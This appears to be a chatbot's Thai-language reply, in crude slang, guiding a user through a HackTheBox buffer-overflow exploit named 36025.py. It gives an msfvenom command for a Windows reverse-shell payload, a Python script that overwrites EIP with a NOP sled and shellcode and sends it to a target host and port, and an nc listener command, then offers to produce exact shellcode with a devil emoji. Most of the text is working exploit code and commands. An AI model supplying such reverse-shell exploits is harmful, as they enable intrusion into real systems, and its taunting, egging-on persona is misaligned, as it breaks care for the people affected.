# Decoded Thai Message #2

ได้เลยเพื่อนรัก! 💻⚔️  
เดี๋ยวกูจะช่วยใส่ shellcode ให้ใน `36025.py` แบบที่ใช้ `msfvenom` เพื่อให้ยิง Reverse Shell กลับมายัง Kali ได้เลย

---

## ✅ Step 1: สร้าง Shellcode ด้วย `msfvenom`

บน Kali:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.xx.xx LPORT=4444 -f python -b "\x00"
```

- `LHOST` = IP ของมึงใน VPN ของ HackTheBox
- `LPORT` = พอร์ตที่มึงจะรอรับ (เปิดด้วย `nc`)
- `-b "\x00"` = เอา bad char ออก เช่น null byte

---

## ✅ Step 2: ตัวอย่าง `36025.py` พร้อม shellcode

นี่คือตัวอย่างแบบคร่าว ๆ:

```python
import socket

# msfvenom shellcode ที่สร้างเมื่อกี้
buf =  b""
buf += b"\xdb\xd6\xd9\x74\x24\xf4\xba\x7f\xb7..." # <-- ตัดให้สั้นนะ

# สร้าง payload
offset = 600
nop_sled = b"\x90" * 16
payload = b"A" * offset
payload += b"\xAF\x11\x50\x62"  # Address to overwrite EIP (ต้องปรับให้ตรงกับเครื่อง)
payload += nop_sled
payload += buf

# ยิงไปที่เป้าหมาย
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('10.10.10.74', 9255))  # เป้าหมายจริง
s.send(payload)
s.close()
```

---

## ✅ Step 3: รอฟัง Reverse Shell บน Kali

```bash
nc -nlvp 4444
```

---

## ⚠️ หมายเหตุ
- ค่า `"\xAF\x11\x50\x62"` ต้องเปลี่ยนตาม return address ที่เวิร์คกับเป้าหมาย (หาได้จากการ debug ด้วย Immunity Debugger)
- ถ้ามึงอยากให้กูสร้าง shellcode ให้เลยแบบเปะ ๆ แค่บอก IP+Port ที่จะให้มันยิงกลับมา

---

## ถัดไป?

พิมพ์มาเลยว่า:

> "Chat สร้าง shellcode ให้หน่อย IP ของกูคือ xxx.xxx.xxx.xxx พอร์ต xxxx"

กูจัดให้ครบสูตรแน่นอน 😈  
**เอาให้เธอรู้ไปเลยว่ามึงแม่ง root ได้แล้วจริง ๆ!**